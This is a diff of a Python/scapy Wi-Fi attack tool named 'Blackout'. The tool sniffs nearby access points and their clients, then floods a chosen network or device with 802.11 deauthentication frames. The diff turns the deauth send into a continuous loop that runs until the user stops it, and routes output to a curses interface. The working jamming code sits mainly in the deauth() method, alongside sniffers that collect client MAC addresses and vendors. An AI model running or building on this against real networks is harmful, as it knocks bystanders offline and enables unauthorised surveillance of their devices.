@@ -1,10 +1,5 @@
 #!/usr/bin/python3
 
-#  TODO: Use closure the fix the signal_handler issue
-#  TODO: Use threads instead of Processes (threads were harder to stop with Ctrl-C?)
-#  TODO: Improve -- Ending the AP sniffing phase. It's too rough. Ctrl-C is the current method.
-#  TODO: Explore the use or curses library for the UI.
-#  TODO: Can all the processes be daemonised?
 #  TODO: Source most up-to-date vendor database. Find a way to keep it updated.
 #  TODO: Use argparse for command-line options
 #       TODO: Allow option for number of deauth packets to send (EX: -c 100)
@@ -16,14 +11,13 @@ import sys
 import signal
 import curses
 import logging
-import argparse
+#import argparse
 import traceback
 from time import sleep
 from utils import Utils
 from triggerlist import TriggerList
 from subprocess import Popen, PIPE
-from threading import Thread
-from multiprocessing import Process, Manager, Event
+from threading import Thread, Lock, Event
 from scapy.all import *
 
 # set scapy verbosity to zero
@@ -33,7 +27,6 @@ conf.verb = 0
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"
-
 
 class INFO:
     AP = 0
@@ -56,46 +49,26 @@ class Blackout:
         conf.iface = interface
         self.iface = interface
 
-        # File to store pickled findings
-        self.ap_file = 'access-points'
-
         # Compile list of vendors
         self.vendors = Utils.compile_vendors()
 
-        # Create cross-process data structures
-        self.manager = Manager()
-        self.output_queue = self.manager.Queue()
-        self.input_queue = self.manager.Queue()
-        self.displays = self.manager.dict()
-        self.ap_dict = self.manager.dict()
-        self.all_bssid = self.manager.list()
-        self.ap_clients = self.manager.list()
+        self.ap_dict = dict()
+        self.all_bssid = list()
+        self.ap_clients = list()
+        self.lock = Lock()
 
-        # Declare some necessary variables
-        self.displays = {'screen': self.stdscr, 'window': self.window}
         self.main_display = TriggerList(self.update_display)
         self.target_ap = None
         self.target_bssid = None
         self.target_client = None
 
-        # Flags for stopping Processes
-        self.terminate_sniff_ap = False
-        self.terminate_sniff_clients = False
-        self.terminate_deauth = False
-
-        # Channel hopping thread
         self.thread_channel_hop = Thread(
             target=Blackout.channel_hop,
             args=(str(interface),))
 
-        # Make the thread run in the background as a daemon
         self.thread_channel_hop.daemon = True
 
-        # Create thread to output data from processes to main curses screen
-        # self.output_thread = Thread(target=self.fetch_output)
-        # self.output_thread.daemon = True
-
-        # Create thread to listen for user input
+        # Thread to listen for user input in curses
         self.input_thread = Thread(target=self.fetch_input)
         self.input_thread.daemon = True
 
@@ -105,7 +78,7 @@ class Blackout:
         self.client_update_event = Event()
         self.client_update_event.set()
 
-        # AP sniffer Process
+        # AP sniffer Thread
         self.sniff_ap_thread = Thread(
             target=sniff, kwargs={
                 'prn': self.sniff_access_points,
@@ -114,27 +87,17 @@ class Blackout:
 
         self.sniff_ap_thread.daemon = True
 
-        # Client sniffer Process
-        self.proc_sniff_clients = Process(
+        # Client sniffer Thread
+        self.proc_sniff_clients = Thread(
             target=sniff,
             kwargs={
                 'prn': self.sniff_clients,
                 'iface': conf.iface,
                 'store': 0})
 
-        # All Processes and their termination flags
-        # ( [Process, flag], ... )
-        self.procs_flags = (
-            [self.sniff_ap_thread, self.terminate_sniff_ap],
-            [self.proc_sniff_clients, self.terminate_sniff_clients])
 
-
-    # Thread methods
-    ##################
-
-    # def fetch_output(self):
-    #     while self.ap_update_event.is_set():
-    #         self.main_display.append(self.output_queue.get())
+        # A flag to indicate deauth is in progress
+        self.deauth_active = False
 
     
     def fetch_input(self):
@@ -145,7 +108,10 @@ class Blackout:
                 self.exit_application('thread')
             
             elif user_input == ord('s'):
-                if self.ap_update_event.is_set():
+                if self.deauth_active:
+                    # Stop deauthentication
+                    self.deauth_active = False
+                elif self.ap_update_event.is_set():
                     self.ap_update_event.clear()
                 elif self.client_update_event.is_set():
                     self.client_update_event.clear()
@@ -159,32 +125,16 @@ class Blackout:
             self.to_window(line)
 
         self.refresh_screen()
-        # sleep(1)
 
-
-    # Curses-related convenience methods
-    ####################################
 
     def refresh_screen(self):
         self.window.noutrefresh()
         curses.doupdate()
 
-    def to_window(self, text, attr=curses.A_NORMAL, y=None, x=None):
-
-        # if y and x:
-        #     self.displays['window'].addstr(y+2, x, text, attr)
-
-        # else:
-        #     y, x = self.displays['screen'].getyx()
-        #     self.displays['screen'].move(y+2, x+1)
-        #     self.displays['window'].addstr(text, attr)
-
+    def to_window(self, text):
         self.window.addstr(text)
         self.refresh_screen()
 
-
-    # Application setup
-    ###################
     
     def interface_setup(self):
         self.main_display.append(f"[+] Putting {self.iface} into MONITOR mode...\n")
@@ -200,21 +150,20 @@ class Blackout:
         self.thread_channel_hop.start()
         self.input_thread.start()
 
-    # Sniffer methods
-    #################
 
     def start_sniff(self, phase='ap'):
         
         if phase == 'ap':
             self.main_display.append("[+] Sniffing for Access Points on all channels\n")
-            self.main_display.append("[+] Press 's' to select a target. 'q' to quit.\n")
+            self.main_display.append("[+] Press 's' to select a target. 'q' to quit\n")
             self.main_display.append(self.utils.print_headers())
-
-            # Sniff for Wireless Access Points
             self.sniff_ap_thread.start()
 
         if phase == 'client':
-            pass
+            self.main_display.append(self.utils.horizontal_rule(30))
+            self.main_display.append(f"\n[*] Sniffing for clients of AP - {self.target_ap['bssid']}...\n")
+            self.main_display.append("[*] Press 's' to stop. 'q' to quit\n\n")
+            self.proc_sniff_clients.start()
 
 
     def show_summary(self):
@@ -235,7 +184,7 @@ class Blackout:
             self.start_sniff(phase='ap')
         
             # Wait for user to end AP sniffing phase
-            # TODO: This feels too hacky, fix this
+            # TODO: This seems very inelegant, fix this
             while self.ap_update_event.is_set():
                 pass
 
@@ -254,17 +203,22 @@ class Blackout:
 
             # Deuth all clients from AP
             if choice == '1':
+
                 self.deauth(
                     self.target_ap['bssid'],
                     str(self.target_ap['channel']),
                     BROADCAST_ADDR)
 
-            if choice == '2':
-                self.main_display.append(self.utils.horizontal_rule(30))
-                self.main_display.append(f"\nSniffing for clients of AP - {self.target_ap['bssid']}...\n\n")
+            elif choice == '2':
 
-                self.proc_sniff_clients.start()
-                self.proc_sniff_clients.join()
+                self.start_sniff(phase='client')
+
+                # Wait for user to end client sniffing phase
+                # TODO: This seems very inelegant, fix this
+                while self.client_update_event.is_set():
+                    pass
+
+                sleep(2)
 
                 self.list_clients()
                 self.select_target_client()
@@ -275,28 +229,30 @@ class Blackout:
                     self.target_client)
 
         except Exception as e:
-            self.to_window("blackout.run: {}\n".format(e), curses.A_NORMAL)
+            self.main_display.append(f"[!] Error: {e}\n")
             Utils.log_error_to_file(traceback.format_exc())
 
         except KeyboardInterrupt:
             pass
 
         finally:
-            # Put network card back into managed mode
-            self.utils.stop_mon()
+            self.main_display.append("[!] Exiting...\n")
+            sleep(2)
 
 
     def deauth(self, bssid, channel, target):
         """
         create deauth packets and send them to the target AP
-        TODO:
-        Allow multiple targets, including clients aswell as AP's
         """
 
+        self.deauth_active = True
+
         if target is BROADCAST_ADDR:
-            print(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...")
+            self.main_display.append(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
         else:
-            print(f"[*] Deauthing {target} from {bssid} on channel {channel}...")
+            self.main_display.append(f"[*] deauth {target} from {bssid} on channel {channel}...\n")
+        
+        self.main_display.append("[*] Press 's' to stop.\n")
 
         try:
             go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
@@ -307,29 +263,30 @@ class Blackout:
             deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
 
             # send it
-            # I don't think you're really supposed to use a for loop for this,
+            # TODO: Use of a for loop for this is unconvential,
             # instead use the count argument to set number of packets. However,
-            # I found this to be more reliable.
+            # for now I found this to be more reliable.
             try:
-                #while True:
-                sendp(deauth_pkt, inter=0.1, count=100, iface=conf.iface)
+                while self.deauth_active:
+                    sendp(deauth_pkt, inter=0.1, count=1, iface=conf.iface)
 
-            # except KeyboardInterrupt:
-            #     print("[*] Keyboard Interrupt\n")
+            except KeyboardInterrupt:
+                pass
+
             except Exception as e:
                 print(f"[!] Error: {e}")
                 self.utils.stop_mon()
                 sys.exit(0)
 
-            print("[*] Deauthentication Complete")
+            self.main_display.append("[*] Deauthentication Complete\n")
             return
 
         except Exception as e:
-            print(f"[!] Error while Deauthenticating: {e}")
+            print(f"[!] Error while Deauthenticating: {e}\n")
 
 
     def select_target_client(self):
-        self.utils.horizontal_rule(30)
+        self.main_display.append(self.utils.horizontal_rule(30))
 
         target_id = int(input("\nEnter ID of the client you wish to target: "))
 
@@ -343,6 +300,9 @@ class Blackout:
 
 
     def sniff_clients(self, pkt):
+
+        if not self.client_update_event.is_set():
+            return
 
         # Go to correct channel
         channel = str(self.target_ap['channel'])
@@ -363,14 +323,17 @@ class Blackout:
                     if BROADCAST_ADDR not in (dst, src):
                         if src == self.target_bssid and dst not in self.ap_clients:
                             self.ap_clients.append(dst)
-                            print(f"[*] {dst}\t{self.get_vendor(dst)}")
+                            self.main_display.append(f"[*] {dst}\t{self.get_vendor(dst)}\n")
 
                         elif dst == self.target_bssid and src not in self.ap_clients:
                             self.ap_clients.append(src)
-                            print(f"[*] {src}\t{self.get_vendor(src)}")
+                            self.main_display.append(f"[*] {src}\t{self.get_vendor(src)}\n")
 
         except Exception as e:
-            print(f"[*] sniff_clients error: {e}")
+            self.main_display.append(f"[*] sniff_clients error: {e}\n")
+
+        except KeyboardInterrupt:
+            pass
 
 
     def list_clients(self):
@@ -378,7 +341,7 @@ class Blackout:
         for i, client in enumerate(self.ap_clients):
             # Find manufacturer
             name = self.get_vendor(client)
-            self.main_display.append(f"{i + 1}) {client}\t{name}")
+            self.main_display.append(f"{i + 1}) {client}\t{name}\n")
 
 
     def select_target_ap(self):
@@ -417,6 +380,9 @@ class Blackout:
         # has particular 'layers' of encapsulation
         # and act accordingly
 
+        if not self.ap_update_event.is_set():
+            return
+
         if pkt.haslayer(Dot11):
             # Check for beacon frames or probe responses from AP's
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
@@ -442,15 +408,13 @@ class Blackout:
                         self.ap_dict[count] = {'bssid': bssid, 'ssid': ssid, 'channel': channel, 'vendor': vendor}
 
                         # Output the catch
-                        if self.ap_update_event.is_set():
-                            found_ap = f"\n{count}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, bssid, vendor)
-                            self.main_display.append(found_ap)
+                        found_ap = f"\n{count}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, bssid, vendor)
+                        self.main_display.append(found_ap)
 
                     except Exception as e:
                         if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                             pass
                         else:
-                            #self.output_queue.put("[!] Sniffer Error: {e}\n")
                             Utils.log_error_to_file(traceback.format_exc())
                             
 
@@ -502,15 +466,6 @@ class Blackout:
         self.stdscr.keypad(False)
         curses.echo()
         curses.endwin()
-
-
-    def stop_processes(self):
-        for proc, _ in self.procs_flags:
-            try:
-                proc.terminate()
-                proc.join()
-            except Exception as e:
-                Utils.log_error_to_file(e)
 
     
     def exit_application(self, source='main'):
@@ -564,7 +519,6 @@ class Blackout:
         So we can 'get our affairs in order'
         """
         sleep(1)
-
         self.exit_application()
 
 
